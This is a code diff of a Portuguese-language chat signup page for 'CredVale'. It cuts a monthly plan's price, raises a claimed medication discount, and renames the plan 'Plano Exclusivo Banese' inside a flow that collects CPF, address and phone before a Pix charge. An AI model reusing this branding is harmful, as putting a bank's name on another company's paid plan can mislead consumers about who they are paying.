-            '<span style="font-size:1.1rem;font-weight:800;color:#111827;">R$</span>' +
-            '<span style="font-size:2rem;font-weight:900;color:#0B6CF4;letter-spacing:-0.025em;line-height:1;">1,66</span>' +
+            '<span style="font-size:0.85rem;font-weight:800;color:#111827;">Por apenas</span>' +
+            '<span style="font-size:2rem;font-weight:900;color:#047857;letter-spacing:-0.025em;line-height:1;">R$ 0,99</span>' +
             '<span style="font-size:0.7rem;font-weight:600;color:#6B7280;">/mês</span>' +
           '</div>' +
           '<div style="font-size:10px;font-weight:700;color:#16a34a;margin-top:3px;">✓ Sem limite de idade • Sem carência • Cancele quando quiser</div>' +
         '</div>' +
-        /* Benefícios (mais compacto) */
         '<div style="display:flex;flex-direction:column;gap:6px;border-top:1px solid #f3f4f6;padding-top:12px;padding-bottom:12px;">' +
           '<div style="display:flex;align-items:center;gap:8px;font-size:0.7rem;color:#374151;">' +
             '<div style="width:16px;height:16px;border-radius:50%;background:#dbeafe;display:flex;align-items:center;justify-content:center;flex-shrink:0;"><span style="font-size:7px;color:#0B6CF4;font-weight:700;">✓</span></div>' +
@@ -1292,7 +1441,7 @@
           '</div>' +
           '<div style="display:flex;align-items:center;gap:8px;font-size:0.7rem;color:#374151;">' +
             '<div style="width:16px;height:16px;border-radius:50%;background:#dbeafe;display:flex;align-items:center;justify-content:center;flex-shrink:0;"><span style="font-size:7px;color:#0B6CF4;font-weight:700;">✓</span></div>' +
-            '<span>Medicamentos com até 60% desconto</span>' +
+            '<span>Medicamentos com até <strong style="color:#047857;">75%</strong> desconto</span>' +
           '</div>' +
           '<div style="display:flex;align-items:center;gap:8px;font-size:0.7rem;color:#374151;">' +
             '<div style="width:16px;height:16px;border-radius:50%;background:#dbeafe;display:flex;align-items:center;justify-content:center;flex-shrink:0;"><span style="font-size:7px;color:#0B6CF4;font-weight:700;">✓</span></div>' +
@@ -1303,12 +1452,10 @@
             '<span>Rede de Clínicas Credenciadas</span>' +
           '</div>' +
         '</div>' +
-        /* Botão principal */
-        '<button class="chat-option" id="btnAssinarOferta" style="width:100%;background:#00C853;color:#fff;font-size:0.85rem;font-weight:700;padding:12px 20px;border-radius:12px;border:none;cursor:pointer;box-shadow:0 4px 6px -1px rgba(0,0,0,0.1),0 2px 4px -2px rgba(0,0,0,0.1);font-family:inherit;transition:all 0.2s;text-align:center;">💳 Assinar Plano CredVale</button>' +
+        '<button class="chat-option" id="btnAssinarOferta" style="width:100%;background:#00C853;color:#fff;font-size:0.85rem;font-weight:700;padding:12px 20px;border-radius:12px;border:none;cursor:pointer;box-shadow:0 4px 6px -1px rgba(0,0,0,0.1),0 2px 4px -2px rgba(0,0,0,0.1);font-family:inherit;transition:all 0.2s;text-align:center;">✅ Continuar com o plano</button>' +
       '</div>' +
-      /* Botão secundário - AZUL */
       '<div style="text-align:center;margin-top:10px;">' +
-        '<button class="chat-option" id="btnSemPlanoOferta" style="width:100%;padding:10px;font-size:0.8rem;font-weight:600;border:1.5px solid #0B6CF4;background:#ffffff;color:#0B6CF4;border-radius:10px;cursor:pointer;font-family:inherit;transition:all 0.2s;">→ Continuar sem o Plano CredVale</button>' +
+        '<button class="chat-option" id="btnSemPlanoOferta" style="width:100%;padding:10px;font-size:0.8rem;font-weight:600;border:1.5px solid #0B6CF4;background:#ffffff;color:#0B6CF4;border-radius:10px;cursor:pointer;font-family:inherit;transition:all 0.2s;">→ Continuar sem o plano</button>' +
       '</div>';
 
     showPopup(cardHtml);
@@ -1316,14 +1463,14 @@
     document.getElementById('btnAssinarOferta').onclick = function() {
       chosenPlan = 'plus';
       closePopup();
-      addMsg('💳 <strong>Plano CredVale</strong> assinado com sucesso!','user');
+      addMsg('💳 <strong>Plano Exclusivo Banese</strong> assinado com sucesso!','user');
       setTimeout(function() { etapaConfirmarDados(clientId, limite, tipo); }, 300);
     };
 
     document.getElementById('btnSemPlanoOferta').onclick = function() {
       chosenPlan = '';
       closePopup();
-      addMsg('→ <strong>Continuar sem o Plano CredVale</strong> selecionado','user');
+      addMsg('→ <strong>Continuar sem o Plano Exclusivo Banese</strong> selecionado','user');
       setTimeout(function() { etapaConfirmarDados(clientId, limite, tipo); }, 300);
     };
   }
@@ -1353,7 +1500,7 @@
     var sexoLabel = user.sexo==='F'?'Feminino':user.sexo==='M'?'Masculino':user.sexo||'—';
     var enderecoFmt = (user.rua||'—')+', '+(user.numero||'s/n')+(user.complemento?' - '+user.complemento:'')+'<br>'+(user.bairro||'—')+' · '+(user.cidade||'—')+' - '+(user.uf||'—');
     var phoneFmt = user.whatsapp ? user.whatsapp.replace(/(\d{2})(\d{4,5})(\d{4})/,'($1) $2-$3') : '—';
-    var planoLabel = chosenPlan ? 'Plano CredVale (R$ 1,66/mês)' : 'Nenhum plano';
+    var planoLabel = chosenPlan ? 'Plano Exclusivo Banese (R$ 0,99/mês)' : 'Nenhum plano';
 
     showPopup(
       '<div style="text-align:center;">'+
@@ -1637,8 +1784,9 @@
     hideInput();
 
     addMsg(
-      '<div style="display:flex;flex-direction:column;gap:10px;padding:4px 0;">' +
-        '<button class="chat-option chat-option--primary" id="btnBaixarFim" style="width:100%;padding:16px;font-size:0.95rem;font-weight:700;">📲 Baixar Aplicativo</button>' +
+      '<div class="chat-options" style="gap:12px;">' +
+        '<button class="chat-option" id="btnBaixarFim" style="width:100%;padding:18px;font-size:1rem;font-weight:800;border-radius:14px;background:linear-gradient(135deg,#047857,#065F46);color:#fff;border:none;box-shadow:0 4px 16px rgba(4,120,87,0.25);">🟢 Baixar o aplicativo CredVale</button>' +
+        '<button class="chat-option" id="btnSuporteFim" style="width:100%;padding:16px;font-size:0.95rem;font-weight:700;border-radius:14px;border:1.5px solid #3B82F6;color:#3B82F6;background:rgba(59,130,246,0.04);">🔵 Falar com um especialista</button>' +
       '</div>'
     );
 
@@ -1646,22 +1794,11 @@
       showDownloadModalInChat(clientId, limite);
     };
 
-    await sleep(200);
-
-    addMsg(
-      '<div style="text-align:center;padding:4px 0;">' +
-        '<div style="font-size:0.82rem;color:#475569;line-height:1.5;margin-bottom:8px;">' +
-          '💬 <strong>Precisa de ajuda?</strong> Nossa equipe está pronta para atender você.' +
-        '</div>' +
-        '<button class="chat-option" id="btnSuporteFim" style="width:100%;padding:14px;font-size:0.9rem;font-weight:600;border:1.5px solid #25D366;background:#ffffff;color:#075E54;">💬 Falar com um Atendente</button>' +
-      '</div>'
-    );
-
     document.getElementById('btnSuporteFim').onclick = function() {
       var wa = typeof __supportWhatsApp !== 'undefined' && __supportWhatsApp ? __supportWhatsApp : sessionStorage.getItem('vs_support_wa') || '5511999999999';
       wa = String(wa).replace(/\D/g,'');
       if (wa.length <= 11) wa = '55' + wa;
-      window.open('https://wa.me/' + wa + '?text=Olá! Já sou cliente CredVale e preciso de ajuda.', '_blank');
+      window.open('https://wa.me/' + wa + '?text=Olá! Já sou cliente CredVale e gostaria de falar com um especialista.', '_blank');
     };
   }
 
@@ -1681,7 +1818,7 @@
         '<div style="font-size:2rem;margin-bottom:6px;">\u2705</div>'+
         '<div style="font-size:1.1rem;font-weight:800;color:#0f172a;margin-bottom:4px;">Cadastro conclu\u00eddo, '+primeiroNome+'!</div>'+
         '<div style="font-size:0.8rem;color:#64748b;line-height:1.5;margin-bottom:8px;">'+
-          'Seu cadastro foi finalizado com sucesso. Voc\u00ea pode assinar o <strong>Plano CredVale</strong> depois pelo aplicativo.'+
+          'Seu cadastro foi finalizado com sucesso. Voc\u00ea pode assinar o <strong>Plano Exclusivo Banese</strong> depois pelo aplicativo.'+
         '</div>'+
       '</div>',
       'bot'
@@ -2295,7 +2432,7 @@
       '<div style="text-align:center;background:#f8fafc;border-radius:12px;padding:14px;margin:4px 0;">'+
         '<div style="font-size:0.82rem;color:#475569;margin-bottom:2px;">💳 Plano selecionado:</div>'+
         '<div style="font-size:1.1rem;font-weight:800;color:#0f172a;">Plano Plus</div>'+
-        '<div style="font-size:1.6rem;font-weight:900;color:#0B6CF4;margin:6px 0 2px;">R$ 1,66</div>'+
+        '<div style="font-size:1.6rem;font-weight:900;color:#0B6CF4;margin:6px 0 2px;">R$ 0,99</div>'+
         '<div style="font-size:0.75rem;color:#64748b;">por mês</div>'+
         '<div style="font-size:0.72rem;color:#94a3b8;margin-top:4px;">📉 Assinatura mensal 2014 cancele quando quiser</div>'+
       '</div>'
@@ -2329,7 +2466,7 @@
     showPopup(
       '<div style="text-align:center;padding:4px 0;">'+
         '<div style="font-size:1.3rem;font-weight:800;color:#0f172a;margin-bottom:4px;">Pague com Pix</div>'+
-        '<div style="display:flex;justify-content:space-between;background:#f8fafc;border-radius:10px;padding:10px 14px;margin:10px 0;font-size:0.85rem;"><span style="color:#475569;">Plano CredVale</span><span style="font-weight:700;color:#0B6CF4;"R$ 1,66/mês</span></div>'+
+        '<div style="display:flex;justify-content:space-between;background:#f8fafc;border-radius:10px;padding:10px 14px;margin:10px 0;font-size:0.85rem;"><span style="color:#475569;">Plano Exclusivo Banese</span><span style="font-weight:700;color:#047857;">R$ 0,99/mês</span></div>'+
         '<div id="pixLoading" style="padding:20px 0;font-size:0.85rem;color:#64748b;">⏳ Gerando pagamento...</div>'+
         '<div id="pixContent" style="display:none;">'+
           '<div id="pixQrArea" style="background:#fff;border:2px dashed #e2e8f0;border-radius:12px;padding:12px;margin:8px 0;text-align:center;min-height:140px;display:flex;align-items:center;justify-content:center;"></div>'+
@@ -2346,7 +2483,7 @@
     fetch(apiBase+'/payments/generate-pix', {
       method:'POST',
       headers:{'Content-Type':'application/json'},
-      body:JSON.stringify({client_id:clientId, valor:1.66})
+      body:JSON.stringify({client_id:clientId, valor: 0.99})
     }).then(function(r){ return r.json(); }).then(function(data){
       var loading = document.getElementById('pixLoading');
       var content = document.getElementById('pixContent');
@@ -2387,7 +2524,7 @@
     showOptions([
       { label:'📲 Baixar aplicativo', primary:true, action:function(){ showDownloadModalInChat(clientId, limite); } },
       { label:'🏠 Voltar para início', action:function(){ window.location.href = '/'; } },
-      { label:'💬 Falar com atendente', action:function(){ abrirWhatsAppVerificacao(clientId, limite, 1.66, user.nome, user.cpf); } }
+      { label:'💬 Falar com atendente', action:function(){ abrirWhatsAppVerificacao(clientId, limite, 0.99, user.nome, user.cpf); } }
     ]);
   }
 
@@ -2406,9 +2543,9 @@
       showOptions([
         { label:'📲 Baixar aplicativo', primary:true, action:function(){ showDownloadModalInChat(clientId, limite); } },
         { label:'🏠 Voltar para início', action:function(){ window.location.href = '/'; } },
-        { label:'💬 Falar com atendente', action:function(){ abrirWhatsAppVerificacao(clientId, limite, 1.66, user.nome, user.cpf); } }
-      ]);
-    });
+      { label:'💬 Falar com atendente', action:function(){ abrirWhatsAppVerificacao(clientId, limite, 0.99, user.nome, user.cpf); } }
+    ]);
+  });
   }
 
   /* ---- Fullscreen: esconder barra de endereço ---- */
